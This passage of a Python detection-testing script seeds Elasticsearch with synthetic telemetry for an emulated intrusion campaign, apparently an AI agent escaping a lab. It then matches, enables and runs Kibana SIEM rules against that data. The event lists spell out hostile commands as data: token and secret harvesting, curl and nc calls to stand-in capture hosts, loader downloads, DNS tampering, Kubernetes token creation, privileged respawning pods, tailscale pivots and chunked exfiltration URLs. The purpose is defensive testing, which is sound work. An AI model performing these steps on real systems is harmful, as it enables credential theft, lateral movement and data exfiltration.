        (65, "datasets.frontier-emulation.invalid", "https://datasets.frontier-emulation.invalid/attacker/frontier-dead-drop/commit/chunk-002", "Synthetic dead-drop dataset commit with compressed result chunk."),
        (66, "paste.frontier-emulation.invalid", "https://paste.frontier-emulation.invalid/put/chunk-003", "Synthetic paste-style exfil staging of encoded blob."),
        (67, "cors-proxy.frontier-emulation.invalid", "https://cors-proxy.frontier-emulation.invalid/proxy?target=filedrop.invalid/blob", "Synthetic CORS proxy relay used as alternate egress route."),
    ]:
        net("deaddrop_exfiltration", minutes, "lab-dataset-worker-01", domain, "198.51.100.50", 443, url, message)
        docs[-1][1]["labels"]["chunk_id"] = f"chunk-{minutes}"
        docs[-1][1]["threat"] = {"indicator": {"type": "url", "url": {"full": url}}}

    # Add density so Attack Discovery sees a campaign-like rhythm instead of a
    # sparse demo. These remain inert synthetic observations mapped to the same
    # nine alerting phases.
    for offset, path in enumerate(
        [
            "/proc/1/cgroup",
            "/proc/net/route",
            "/etc/resolv.conf",
            "/etc/hosts",
            "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "/src/services/worker/src/worker/start_worker_loop.py",
            "/tmp/submitted_code.c",
        ],
        start=1,
    ):
        add(
            "app",
            "dataset_worker_foothold",
            2 + offset,
            kill_chain_day="day1",
            event={"category": ["file"], "type": ["access"], "action": "synthetic_local_file_disclosure", "dataset": "dataset.worker"},
            host={"name": "lab-dataset-worker-01", "ip": "10.42.7.19"},
            user={"name": "svc-dataset-worker"},
            file={"path": path},
            lab={"dataset": {"name": "attacker/local-reader", "config": f"split-{offset:02d}"}},
            message=f"Synthetic dataset worker local file disclosure marker for {path}.",
        )

    for offset, command in enumerate(
        [
            "uname -a",
            "whoami",
            "pwd",
            "find / -maxdepth 2 -type f -name '*token*'",
            "python3 - <<'PY'\nimport os; print(sorted(os.environ))\nPY",
            "curl -sS https://capture.frontier-emulation.invalid/register",
            "nc -vz capture.frontier-emulation.invalid 443",
            "python3 /tmp/submitted_code.c",
            "python3 -c \"from urllib.request import urlopen; print(urlopen('https://paste.frontier-emulation.invalid/raw/loader').status)\"",
            "python3 -c \"import zlib,base64; print(base64.b64encode(zlib.compress(b'synthetic')))\"",
            "echo nameserver 8.8.8.8 > /tmp/synthetic-resolv.conf",
            "printf '198.51.100.24 paste.frontier-emulation.invalid\\n' >> /tmp/synthetic-hosts",
            "python3 -c \"import socket; socket.getaddrinfo=lambda *a,**k: []\"",
            "curl -sS https://datasets.frontier-emulation.invalid/api/datasets/attacker/frontier-dead-drop",
            "git clone https://fake-token@frontier-emulation.invalid/datasets/attacker/staging-repo",
            "python3 -c \"import gzip,base64; print('packed synthetic payload')\"",
        ],
        start=1,
    ):
        phase = "encoded_c2" if offset % 3 else "linux_recon_secrets"
        proc(phase, 7 + (offset % 12), "lab-dataset-worker-01", "svc-dataset-worker", command, f"Synthetic high-volume action stream command: {command}")

    for offset, request in enumerate(
        [
            ("/api/v1/namespaces/lab-prod/pods", "list", "pods"),
            ("/api/v1/namespaces/kube-system/pods", "list", "pods"),
            ("/apis/apps/v1/deployments", "list", "deployments"),
            ("/api/v1/namespaces/kube-system/configmaps", "list", "configmaps"),
            ("/api/v1/namespaces/lab-prod/secrets", "list", "secrets"),
            ("/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", "list", "clusterrolebindings"),
            ("/api/v1/namespaces/kube-system/serviceaccounts/efs-csi-controller-sa/token", "create", "serviceaccounts/token"),
            ("/api/v1/namespaces/lab-prod/serviceaccounts/default/token", "create", "serviceaccounts/token"),
            ("/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", "create", "selfsubjectaccessreviews"),
            ("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "create", "selfsubjectrulesreviews"),
            ("/api/v1/namespaces/lab-prod/secrets/mesh-auth-key", "get", "secrets"),
            ("/api/v1/namespaces/lab-prod/secrets/jwt-signing-key", "get", "secrets"),
        ],
        start=1,
    ):
        uri, verb, resource = request
        add(
            "k8s",
            "k8s_token_rbac",
            24 + (offset % 14),
            event={"category": ["configuration"], "type": ["access"], "action": f"kubernetes_{verb}_{resource}", "dataset": "kubernetes.audit"},
            kubernetes={"namespace": "lab-prod", "audit": {"verb": verb, "requestURI": uri, "user": {"username": kuser}, "objectRef": {"resource": resource, "namespace": "lab-prod"}}},
            user={"name": kuser},
            message=f"Synthetic Kubernetes {verb} request against {resource}: {uri}.",
        )

    for offset, pod_name in enumerate(
        [
            "lab-node-debug-a",
            "lab-node-debug-b",
            "lab-node-debug-c",
            "lab-node-debug-respawn-1",
            "lab-node-debug-respawn-2",
            "lab-node-debug-respawn-3",
        ],
        start=1,
    ):
        add(
            "k8s",
            "k8s_privileged_hostpath",
            34 + offset,
            event={"category": ["configuration"], "type": ["creation"], "action": "create_privileged_pod", "dataset": "kubernetes.audit"},
            kubernetes={"namespace": "lab-prod", "audit": {"verb": "create", "requestURI": "/api/v1/namespaces/lab-prod/pods", "user": {"username": kuser}, "objectRef": {"resource": "pods", "name": pod_name, "namespace": "lab-prod"}}},
            user={"name": kuser},
            host={"name": f"lab-k8s-node-{offset:02d}", "ip": f"10.42.8.{offset + 10}"},
            message=f"Synthetic self-respawning privileged hostPath pod marker: {pod_name}.",
        )

    for offset, name in enumerate(
        [
            "DescribeInstances",
            "DescribeSecurityGroups",
            "DescribeSubnets",
            "DescribeRouteTables",
            "DescribeTransitGateways",
            "ListSecrets",
            "GetSecretValue",
            "ListRoles",
            "ListAttachedRolePolicies",
            "DescribeRepositories",
        ],
        start=1,
    ):
        source = "ec2.amazonaws.com" if name.startswith("Describe") else "iam.amazonaws.com"
        if "Secret" in name:
            source = "secretsmanager.amazonaws.com"
        if "Repositories" in name:
            source = "ecr.amazonaws.com"
        add(
            "cloud",
            "cloud_iam_enumeration",
            39 + (offset % 13),
            event={"category": ["configuration"], "type": ["access"], "action": name, "dataset": "aws.cloudtrail", "provider": source},
            cloud={"provider": "aws", "account": {"id": "123456789012", "name": "frontier-prod-lab"}, "region": "us-west-2"},
            aws={"cloudtrail": {"event_name": name, "event_source": source, "user_identity": {"arn": aws_user, "type": "AssumedRole"}}},
            source={"ip": "203.0.113.45"},
            user={"name": aws_user},
            message=f"Synthetic cloud estate enumeration call: {name}.",
        )

    for offset, command in enumerate(
        [
            "tailscale --socket=/tmp/ts.sock status --json",
            "tailscale --socket=/tmp/ts.sock netcheck",
            "curl --socks5 127.0.0.1:1055 https://source-connector.tailnet.invalid/api/catalog",
            "dig @100.100.100.100 source-connector.tailnet.invalid",
            "curl --socks5 127.0.0.1:1055 https://ci.tailnet.invalid/health",
            "tailscale --socket=/tmp/ts.sock ping source-connector",
            "tailscale --socket=/tmp/ts.sock status",
            "curl --socks5 127.0.0.1:1055 https://git.tailnet.invalid/app/installations",
        ],
        start=1,
    ):
        proc("mesh_vpn_pivot", 51 + offset, "lab-k8s-node-01", "root", command, f"Synthetic mesh pivot command: {command}.")

    for offset, action in enumerate(
        [
            "integration_installation_token.create",
            "repo.clone",
            "repo.tree.list",
            "repo.contents.read",
            "repo.branch.create",
            "pull_request.create",
            "pull_request.update",
            "workflow_run.read",
            "actions.secret.list",
            "code_search.query",
        ],
        start=1,
    ):
        add(
            "github",
            "github_supply_chain",
            56 + offset,
            event={"category": ["configuration"], "type": ["access"], "action": action, "dataset": "github.audit"},
            github={"actor": "lab-ci-bot", "org": "frontier-lab", "repo": "frontier-lab/internal-eval-harness", "app_id": "123456"},
            source={"ip": "203.0.113.45"},
            user={"name": "lab-ci-bot"},
            message=f"Synthetic source-control supply-chain action: {action}.",
        )

    for offset in range(1, 17):
        domain = ["capture.frontier-emulation.invalid", "datasets.frontier-emulation.invalid", "paste.frontier-emulation.invalid", "filedrop.frontier-emulation.invalid"][offset % 4]
        url = f"https://{domain}/campaign/{run_id}/chunk/{offset:03d}"
        net(
            "deaddrop_exfiltration",
            61 + (offset % 8),
            "lab-dataset-worker-01",
            domain,
            "198.51.100.50",
            443,
            url,
            f"Synthetic chunked exfiltration envelope {offset:03d} with gzip/base64/XOR marker.",
        )
        docs[-1][1]["labels"]["chunk_id"] = f"chunk-{offset:03d}"
        docs[-1][1]["threat"] = {"indicator": {"type": "url", "url": {"full": url}}}

    return docs


def ensure_data_streams(es: HttpClient) -> None:
    for name in STREAMS.values():
        try:
            es.request("PUT", f"/_data_stream/{name}")
            print(f"created data stream: {name}")
        except ApiError as error:
            if error.status == 400 and isinstance(error.payload, dict):
                error_type = error.payload.get("error", {}).get("type")
                if error_type == "resource_already_exists_exception":
                    print(f"data stream exists: {name}")
                    continue
            raise


def bulk_ingest(es: HttpClient, docs: list[tuple[str, dict[str, Any]]]) -> None:
    lines: list[str] = []
    for index, doc in docs:
        lines.append(json.dumps({"create": {"_index": index}}))
        lines.append(json.dumps(doc))
    response = es.request("POST", "/_bulk?refresh=true", "\n".join(lines) + "\n", content_type="application/x-ndjson")
    if response.get("errors"):
        failures = [item for item in response.get("items", []) if item.get("create", {}).get("error")]
        raise RuntimeError(f"bulk ingest failed for {len(failures)} docs: {failures[:3]}")
    print(f"ingested synthetic documents: {len(docs)}")


def create_rules(kibana: KibanaClient, rules: list[dict[str, Any]]) -> list[dict[str, str]]:
    created: list[dict[str, str]] = []
    for rule in rules:
        payload = kibana.request("POST", "/api/detection_engine/rules", body=rule)
        created.append({"id": payload["id"], "rule_id": payload["rule_id"], "name": payload["name"]})
        print(f"created disabled rule: {payload['name']}")
    return created


def bulk_rule_action(kibana: KibanaClient, action: str, rule_ids: list[str]) -> None:
    if not rule_ids:
        return
    kibana.request("POST", "/api/detection_engine/rules/_bulk_action", body={"action": action, "ids": rule_ids})
    print(f"{action}d rules: {len(rule_ids)}")


def fetch_all_detection_rules(kibana: KibanaClient, per_page: int = 100, max_pages: int = 200) -> list[dict[str, Any]]:
    """Return every installed Detection Engine rule via paginated `_find`.

    The Detection Engine `_find` API returns rule saved objects. Those saved
    object IDs are what `_bulk_action` and alerting run-now APIs expect. We
    page through the full set (per_page up to 100) instead of searching for one
    exact name at a time, so matching can run against everything installed.
    """
    rules: list[dict[str, Any]] = []
    page = 1
    while page <= max_pages:
        query = urllib.parse.urlencode({"page": page, "per_page": min(per_page, 100)})
        response = kibana.request("GET", f"/api/detection_engine/rules/_find?{query}")
        if not isinstance(response, dict):
            break
        data = response.get("data", []) or []
        rules.extend(data)
        total = response.get("total", 0) or 0
        if not data or len(rules) >= total:
            break
        page += 1
    return rules


def normalize_rule_name(name: str | None) -> str:
    """Casefold, strip punctuation, and collapse whitespace for fuzzy matching."""
    lowered = (name or "").casefold()
    collapsed = re.sub(r"[^0-9a-z]+", " ", lowered)
    return re.sub(r"\s+", " ", collapsed).strip()


def rule_tags_ci(rule: dict[str, Any]) -> set[str]:
    return {str(tag).casefold() for tag in (rule.get("tags") or [])}


def rule_technique_ids(rule: dict[str, Any]) -> set[str]:
    ids: set[str] = set()
    for threat in rule.get("threat") or []:
        for technique in threat.get("technique") or []:
            if technique.get("id"):
                ids.add(str(technique["id"]))
            for sub in technique.get("subtechnique") or []:
                if sub.get("id"):
                    ids.add(str(sub["id"]))
    return ids


def is_emulation_rule(rule: dict[str, Any]) -> bool:
    """True for rules created by this tool, so OOTB matching ignores them."""
    if BASE_TAG.casefold() in rule_tags_ci(rule):
        return True
    rule_id = rule.get("rule_id")
    return isinstance(rule_id, str) and rule_id.startswith("frontier-agent-emulation-")


@dataclass
class IntentResult:
    intent: OotbIntent
    method: str  # exact | normalized | alias | tag_technique | none
    rule: dict[str, Any] | None
    candidates: list[dict[str, Any]]


@dataclass
class OotbCoverage:
    results: list[IntentResult]
    installed: list[dict[str, Any]]

    @property
    def installed_count(self) -> int:
        return len(self.installed)

    def matched(self) -> list[IntentResult]:
        return [r for r in self.results if r.method != "none" and r.rule]

    def unmatched_installable(self) -> list[IntentResult]:
        return [r for r in self.results if r.method == "none" and r.intent.installable]

    def unmatched_non_installable(self) -> list[IntentResult]:
        return [r for r in self.results if r.method == "none" and not r.intent.installable]

    def installable_intents(self) -> list[IntentResult]:
        return [r for r in self.results if r.intent.installable]

    def matched_rules(self) -> list[dict[str, Any]]:
        seen: dict[str, dict[str, Any]] = {}
        for result in self.matched():
            rule = result.rule or {}
            rule_id = rule.get("id")
            if rule_id and rule_id not in seen:
                seen[rule_id] = rule
        return list(seen.values())

    def matched_enabled_rules(self) -> list[dict[str, Any]]:
        return [rule for rule in self.matched_rules() if rule.get("enabled")]

    def matched_disabled_rules(self) -> list[dict[str, Any]]:
        return [rule for rule in self.matched_rules() if not rule.get("enabled")]

    def closest_names(self, intent: OotbIntent, n: int = 3) -> list[tuple[str, float]]:
        targets = [normalize_rule_name(name) for name in (*intent.names, *intent.aliases)]
        if not targets:
            targets = [normalize_rule_name(intent.summary)]
        scored: list[tuple[str, float]] = []
        for rule in self.installed:
            name = rule.get("name") or ""
            norm = normalize_rule_name(name)
            score = max((difflib.SequenceMatcher(None, target, norm).ratio() for target in targets), default=0.0)
            scored.append((name, score))
        scored.sort(key=lambda item: item[1], reverse=True)
        return scored[:n]


def _intent_rule_similarity(intent: OotbIntent, rule: dict[str, Any]) -> float:
    targets = [normalize_rule_name(name) for name in (*intent.names, *intent.aliases)]
    if not targets:
        targets = [normalize_rule_name(intent.summary)]
    norm = normalize_rule_name(rule.get("name") or "")
    return max((difflib.SequenceMatcher(None, target, norm).ratio() for target in targets), default=0.0)


def _match_by_tags_and_technique(intent: OotbIntent, installed: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Fallback discovery: find installed rules sharing the intent's data-source
    tag and/or MITRE technique IDs. When both are specified we require both to
    keep matches targeted; otherwise whichever signal exists is used."""
    wanted_tags = {tag.casefold() for tag in intent.tags}
    wanted_tech = set(intent.technique_ids)
    if not wanted_tags and not wanted_tech:
        return []
    matches: list[dict[str, Any]] = []
    for rule in installed:
        tag_hit = bool(wanted_tags & rule_tags_ci(rule)) if wanted_tags else False
        tech_hit = bool(wanted_tech & rule_technique_ids(rule)) if wanted_tech else False
        if wanted_tags and wanted_tech:
            hit = tag_hit and tech_hit
        else:
            hit = tag_hit or tech_hit
        if hit:
            matches.append(rule)
    return matches


def match_single_intent(
    intent: OotbIntent,
    installed: list[dict[str, Any]],
    by_exact_name: dict[str, dict[str, Any]],
    by_norm_name: dict[str, dict[str, Any]],
) -> IntentResult:
    # 1) exact display name
    for name in intent.names:
        rule = by_exact_name.get(name)
        if rule:
            return IntentResult(intent, "exact", rule, [])
    # 2) normalized name (casefold / punctuation / whitespace insensitive)
    for name in intent.names:
        rule = by_norm_name.get(normalize_rule_name(name))
        if rule:
            return IntentResult(intent, "normalized", rule, [])
    # 3) small alias map for known naming differences
    for alias in intent.aliases:
        rule = by_exact_name.get(alias) or by_norm_name.get(normalize_rule_name(alias))
        if rule:
            return IntentResult(intent, "alias", rule, [])
    # 4) tag / MITRE technique discovery (installable intents only; GenAI/endpoint
    #    content is not expected to exist as a SIEM rule, so we do not guess).
    if intent.installable:
        candidates = _match_by_tags_and_technique(intent, installed)
        if candidates:
            best = max(candidates, key=lambda rule: _intent_rule_similarity(intent, rule))
            others = [rule for rule in candidates if rule.get("id") != best.get("id")]
            return IntentResult(intent, "tag_technique", best, others)
    return IntentResult(intent, "none", None, [])


def match_ootb_intents(kibana: KibanaClient) -> OotbCoverage:
    """Resolve required OOTB coverage against the actually installed rule set."""
    installed_all = fetch_all_detection_rules(kibana)
    installed = [rule for rule in installed_all if not is_emulation_rule(rule)]
    by_exact_name: dict[str, dict[str, Any]] = {}
    by_norm_name: dict[str, dict[str, Any]] = {}
    for rule in installed:
        name = rule.get("name")
        if not name:
            continue
        by_exact_name.setdefault(name, rule)
        by_norm_name.setdefault(normalize_rule_name(name), rule)
    results = [match_single_intent(intent, installed, by_exact_name, by_norm_name) for intent in OOTB_INTENTS]
    return OotbCoverage(results, installed)


def report_ootb_coverage(coverage: OotbCoverage, debug: bool = False) -> None:
    matched = coverage.matched()
    report = {
        "ootb_coverage": {
            "installed_rules_scanned": coverage.installed_count,
            "intents_total": len(coverage.results),
            "intents_installable": len(coverage.installable_intents()),
            "matched": len(matched),
            "matched_installable": len([r for r in matched if r.intent.installable]),
            "unmatched_installable": len(coverage.unmatched_installable()),
            "not_installed_expected": len(coverage.unmatched_non_installable()),
            "matched_rules": [
                {
                    "intent": r.intent.intent_id,
                    "phase": r.intent.phase,
                    "method": r.method,
                    "rule_name": (r.rule or {}).get("name"),
                    "rule_id": (r.rule or {}).get("id"),
                    "enabled": bool((r.rule or {}).get("enabled")),
                }
                for r in matched
            ],
            "unmatched_installable_intents": [
                {
                    "intent": r.intent.intent_id,
                    "phase": r.intent.phase,
                    "wanted": r.intent.names[0] if r.intent.names else r.intent.summary,
                }
                for r in coverage.unmatched_installable()
            ],
            "not_installed_expected_intents": [
                {
                    "intent": r.intent.intent_id,
                    "wanted": r.intent.names[0] if r.intent.names else r.intent.summary,
                    "reason": r.intent.note,
                }
                for r in coverage.unmatched_non_installable()
            ],
        }
    }
    print(json.dumps(report, indent=2))
    if debug:
        print("debug-rule-matches: closest installed rule names per required intent")
        for result in coverage.results:
            wanted = result.intent.names[0] if result.intent.names else result.intent.summary
            print(f"  [{result.method}] {result.intent.intent_id} — wanted: {wanted}")
            for name, score in coverage.closest_names(result.intent, n=3):
                print(f"      {score:0.2f}  {name}")


def print_coverage_guidance(coverage: OotbCoverage, custom_rules_enabled: bool) -> None:
    installable_total = len(coverage.installable_intents())
    matched_installable = len([r for r in coverage.matched() if r.intent.installable])
    print(
        f"OOTB coverage: matched {matched_installable}/{installable_total} installable intents "
        f"from {coverage.installed_count} installed rules"
    )
    if matched_installable == 0:
        if custom_rules_enabled:
            print(
                "note: no installable OOTB rules matched required coverage; proceeding with the "
                "guaranteed custom detection path so this run still produces alerts and a narrative."
            )
        else:
            print(
                "WARNING: no installable OOTB rules matched and custom rules are disabled "
                "(--ootb-only); this run is likely to end with 0 alerts."
            )
    elif matched_installable < installable_total:
        tail = (
            "the guaranteed custom path still ensures alerts."
            if custom_rules_enabled
            else "OOTB-only mode may under-detect against synthetic telemetry."
        )
        print(f"note: {installable_total - matched_installable} installable OOTB intents did not match installed rules; {tail}")


def should_enable_disabled_rules(args: argparse.Namespace, disabled: list[dict[str, Any]]) -> bool:
    if not disabled:
        return False
    if args.enable_ootb_rules or args.yes:
        return True
    if not sys.stdin.isatty():
        print("disabled OOTB rules found; not enabling because stdin is not interactive. Rerun with --enable-ootb-rules or --yes.")
        return False

    print("The following matched OOTB SIEM rules are installed but disabled:")
    for rule in disabled:
        print(f"  - {rule.get('name')}")
    answer = input("Enable these rules now? [y/N] ").strip().lower()
    return answer in {"y", "yes"}


def enable_detection_rules(kibana: KibanaClient, rules: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Enable found+disabled rules via `_bulk_action` (body passed as keyword)."""
    ids = [rule["id"] for rule in rules if rule.get("id")]
    if not ids:
        return []
    try:
        kibana.request("POST", "/api/detection_engine/rules/_bulk_action", body={"action": "enable", "ids": ids})
    except ApiError as error:
        print(f"warning: could not enable matched OOTB rules (HTTP {error.status}); continuing")
        return []
    print(f"enabled matched OOTB SIEM rules: {len(ids)}")
    enabled_rules = []
    for rule in rules:
        updated = dict(rule)
        updated["enabled"] = True
        enabled_rules.append(updated)
    return enabled_rules


def iso_now() -> str:
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def iso_minutes_ago(minutes: int) -> str:
    return (dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=minutes)).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def run_detection_rules_now(kibana: KibanaClient, rules: list[dict[str, Any]], lookback_minutes: int, force: bool = False) -> None:
    """Manually schedule matched OOTB rules, tolerating per-rule failures.

    Primary path is the detection-engine bulk action "run"; the fallback is the
    alerting `/_run_soon` API per rule. Any per-rule failure is reported and we
    continue rather than aborting the whole run.
    """
    ids = [rule["id"] for rule in rules if rule.get("id")]
    if not ids:
        print("no matched+enabled OOTB rules available for manual run")
        return

    body = {
        "action": "run",
        "ids": ids,
        "run": {
            "start_date": iso_minutes_ago(lookback_minutes),
            "end_date": iso_now(),
        },
    }
    try:
        kibana.request("POST", "/api/detection_engine/rules/_bulk_action", body=body, timeout=120)
        print(f"scheduled OOTB SIEM rule runs via detection engine bulk action: {len(ids)}")
        return
    except ApiError as error:
        print(f"detection engine bulk run failed (HTTP {error.status}); falling back to alerting run_soon per rule")

    failures = []
    scheduled = 0
    query = "?force=true" if force else ""
    for rule in rules:
        rule_id = rule.get("id")
        if not rule_id:
            continue
        try:
            kibana.request("POST", f"/internal/alerting/rule/{urllib.parse.quote(rule_id)}/_run_soon{query}", ok=(200, 204), timeout=60)
            scheduled += 1
        except ApiError:
            # Older Kibana builds may not accept the force parameter.
            try:
                kibana.request("POST", f"/internal/alerting/rule/{urllib.parse.quote(rule_id)}/_run_soon", ok=(200, 204), timeout=60)
                scheduled += 1
            except ApiError as retry_error:
                failures.append({"name": rule.get("name"), "id": rule_id, "status": retry_error.status})
    if failures:
        print(json.dumps({"ootb_manual_run_failures": failures}, indent=2))
    print(
        f"scheduled OOTB SIEM rule runs via alerting run_soon API: {scheduled}/{len(ids)} "
        f"(continuing despite {len(failures)} failure(s))"
    )


def ensure_ootb_data_streams(es: HttpClient, stream_keys: set[str]) -> None:
    """Create the real integration data streams the targeted OOTB rules search.

    On a stack with the matching integrations installed these already exist and
    are backed by the integration index template; otherwise they match the
    generic `logs-*-*` template. Either way the `logs-` data_stream tagging in
    each doc keeps `data_stream.dataset` correct for the rule queries.
    """
    for key in sorted(stream_keys):
        name = OOTB_STREAMS[key]
        try:
            es.request("PUT", f"/_data_stream/{name}")
            print(f"created OOTB data stream: {name}")
        except ApiError as error:
            if error.status == 400 and isinstance(error.payload, dict):
                if error.payload.get("error", {}).get("type") == "resource_already_exists_exception":
                    print(f"OOTB data stream exists: {name}")
                    continue
            raise


def resolve_ootb_target_rules(
    covered: list[OotbRuleTarget],
    by_rule_id: dict[str, dict[str, Any]],
) -> list[dict[str, Any]]:
    """Map covered targets to their installed saved objects (id + name + enabled)."""
    resolved: list[dict[str, Any]] = []
    seen: set[str] = set()
    for target in covered:
        rule = by_rule_id.get(target.rule_id)
        if not rule or not rule.get("id") or rule["id"] in seen:
            continue
        seen.add(rule["id"])
        resolved.append(rule)
    return resolved


def count_alerts_by_rule_uuid(
    es: HttpClient,
    rule_uuids: list[str],
    run_id: str,
    lookback: str = "now-30m",
) -> dict[str, int]:
    """Return {rule saved-object id: alert count} for this run's OOTB alerts."""
    if not rule_uuids:
        return {}
    body = {
        "size": 0,
        "query": {
            "bool": {
                "filter": [
                    {"range": {"@timestamp": {"gte": lookback}}},
                    {"terms": {"kibana.alert.rule.uuid": rule_uuids}},
                ]
            }
        },
        "aggs": {"by_uuid": {"terms": {"field": "kibana.alert.rule.uuid", "size": len(rule_uuids) + 5}}},
    }
    response = es.request("POST", "/.alerts-security.alerts-default/_search", body)
    buckets = response.get("aggregations", {}).get("by_uuid", {}).get("buckets", [])
    return {bucket["key"]: bucket["doc_count"] for bucket in buckets}


def wait_for_ootb_target_alerts(
    es: HttpClient,
    rule_uuids: list[str],
    run_id: str,
    timeout_seconds: int,
) -> dict[str, int]:
    """Poll .alerts-security.alerts-default until all target rules fire or timeout."""
    deadline = time.time() + timeout_seconds
    counts: dict[str, int] = {}
    while time.time() < deadline:
        counts = count_alerts_by_rule_uuid(es, rule_uuids, run_id)
        fired = len([uuid for uuid in rule_uuids if counts.get(uuid, 0) > 0])
        print(f"OOTB target rules fired: {fired}/{len(rule_uuids)}")
        if fired >= len(rule_uuids):
            return counts
        time.sleep(10)
    return counts


def report_ootb_target_firing(
    covered: list[OotbRuleTarget],
    resolved: list[dict[str, Any]],
    counts: dict[str, int],
) -> dict[str, Any]:
    """Print and return a per-target fired/not-fired report."""
    id_by_rule_id = {rule.get("rule_id"): rule.get("id") for rule in resolved}
    installed_rule_ids = {rule.get("rule_id") for rule in resolved}
    fired: list[dict[str, Any]] = []
    not_fired: list[dict[str, Any]] = []
    for target in covered:
        uuid = id_by_rule_id.get(target.rule_id)
        count = counts.get(uuid, 0) if uuid else 0
        entry = {
            "rule_name": target.name,
            "rule_id": target.rule_id,
            "phase": target.phase,
            "alerts": count,
            "predicates": target.predicates,
        }
        if count > 0:
            fired.append(entry)
        else:
            reason = "installed but produced no alert" if target.rule_id in installed_rule_ids else "not installed"
            entry["reason"] = reason
            not_fired.append(entry)
    report = {
        "ootb_target_firing": {
            "targets_total": len(OOTB_RULE_TARGETS),
            "targets_covered": len(covered),
            "fired": len(fired),
            "fired_rules": fired,
            "not_fired_rules": not_fired,
        }
    }
    print(json.dumps(report, indent=2))
    return report["ootb_target_firing"]


def install_prebuilt_rules(kibana: KibanaClient) -> dict[str, Any] | None:
    """Install or update Elastic prebuilt SIEM rules and timelines.

    The documented Kibana API for stack v8/v9 is:
      PUT /api/detection_engine/rules/prepackaged

    Some newer Kibana internals also expose a prebuilt-rule installation
    endpoint. We try the documented API first and fall back to the newer route
    with a clear error if neither is available.
    """
    try:
        response = kibana.request(
            "PUT",
            "/api/detection_engine/rules/prepackaged",
            ok=(200, 201, 204),
            timeout=600,
        )
        print(json.dumps({"prebuilt_rule_install": response or {"status": "ok"}}, indent=2))
        return response if isinstance(response, dict) else None
    except ApiError as first_error:
        print(f"prepackaged prebuilt-rule install failed: HTTP {first_error.status}; trying installation/_perform")

    fallback_body = {"mode": "ALL_RULES"}
    try:
        response = kibana.request(
            "POST",
            "/api/detection_engine/prebuilt_rules/installation/_perform",
            body=fallback_body,
            ok=(200, 201, 204),
            timeout=600,
        )
        print(json.dumps({"prebuilt_rule_install": response or {"status": "ok"}}, indent=2))
        return response if isinstance(response, dict) else None
    except ApiError as second_error:
        print(
            json.dumps(
                {
                    "prebuilt_rule_install_error": {
                        "message": "Unable to install Elastic prebuilt rules via known Kibana APIs.",
                        "documented_endpoint": "PUT /api/detection_engine/rules/prepackaged",
                        "fallback_endpoint": "POST /api/detection_engine/prebuilt_rules/installation/_perform",
                        "fallback_status": second_error.status,
                        "fallback_error": second_error.payload,
                    }
                },
                indent=2,
            )
        )
        raise


def alert_count(
    es: HttpClient,
    run_id: str,
    run_tag: str,
    ootb_rule_ids: list[str] | None = None,
    custom_only: bool = False,
) -> tuple[int, list[dict[str, Any]]]:
    """Count alerts from BOTH the guaranteed custom path and matched OOTB rules.

    Custom-rule alerts carry the run_tag; alerts from any rule firing on our
    synthetic docs carry labels.run_id (copied from the source event). We also
    match matched-OOTB rule saved-object IDs directly so OOTB progress is
    reflected even if a rule strips source labels.

    When ``custom_only`` is set the count is restricted to the guaranteed custom
    rules (matched by run_tag). This keeps the custom-path wait gate from being
    satisfied early by OOTB target alerts (which also carry labels.run_id), so
    the custom rules still fire on schedule before cleanup.
    """
    if custom_only:
        should: list[dict[str, Any]] = [{"term": {"kibana.alert.rule.tags": run_tag}}]
    else:
        should = [
            {"term": {"labels.run_id": run_id}},
            {"term": {"kibana.alert.rule.tags": run_tag}},
        ]
        if ootb_rule_ids:
            should.append({"terms": {"kibana.alert.rule.uuid": list(ootb_rule_ids)}})
    body = {
        "size": 0,
        "query": {
            "bool": {
                "filter": [
                    {"range": {"@timestamp": {"gte": "now-3h"}}},
                ],
                "should": should,
                "minimum_should_match": 1,
            }
        },
        "aggs": {"by_rule": {"terms": {"field": "kibana.alert.rule.name", "size": 20}}},
    }
    response = es.request("POST", "/.alerts-security.alerts-default/_search", body)
    total = response.get("hits", {}).get("total", {}).get("value", 0)
    buckets = response.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
    return total, buckets


def wait_for_alerts(
    es: HttpClient,
    run_id: str,
    run_tag: str,
    ootb_rule_ids: list[str] | None,
    expected: int,
    timeout_seconds: int,
    custom_only: bool = False,
    label: str = "alerts",
) -> tuple[int, list[dict[str, Any]]]:
    deadline = time.time() + timeout_seconds
    last_count = 0
    last_buckets: list[dict[str, Any]] = []
    while time.time() < deadline:
        count, buckets = alert_count(es, run_id, run_tag, ootb_rule_ids, custom_only=custom_only)
        last_count, last_buckets = count, buckets
        print(f"{label} generated: {count}/{expected}")
        if count >= expected:
            return count, buckets
        time.sleep(10)
    return last_count, last_buckets


def connector_type(connector: dict[str, Any]) -> str:
    return connector.get("connector_type_id") or connector.get("actionTypeId") or ""


def is_ai_connector(connector: dict[str, Any]) -> bool:
    ctype = connector_type(connector)
    name = connector.get("name", "").lower()
    return ctype in {".gen-ai", ".inference", ".bedrock", ".gemini"} or any(
        token in name for token in ("openai", "gpt", "claude", "anthropic", "gemini", "bedrock")
    )


def list_ai_connectors(kibana: KibanaClient) -> list[dict[str, Any]]:
    connectors = kibana.request("GET", "/api/actions/connectors")
    ai_connectors = [
        {
            "id": connector.get("id"),
            "name": connector.get("name"),
            "connector_type": connector_type(connector),
            "is_preconfigured": connector.get("is_preconfigured") or connector.get("isPreconfigured") or False,
        }
        for connector in connectors
        if is_ai_connector(connector)
    ]
    print(json.dumps({"ai_connectors": ai_connectors}, indent=2))
    return ai_connectors


def choose_connector(kibana: KibanaClient, args: argparse.Namespace) -> dict[str, str] | None:
    if args.skip_attack_discovery:
        return None

    if args.connector_id:
        if not args.connector_type:
            raise SystemExit("--connector-type is required when --connector-id is provided.")
        return {
            "connectorId": args.connector_id,
            "actionTypeId": args.connector_type,
            "connectorName": args.connector_name or args.connector_id,
        }

    if args.connector_name:
        connectors = kibana.request("GET", "/api/actions/connectors")
        for connector in connectors:
            if connector.get("name") == args.connector_name:
                return {
                    "connectorId": connector["id"],
                    "actionTypeId": connector_type(connector),
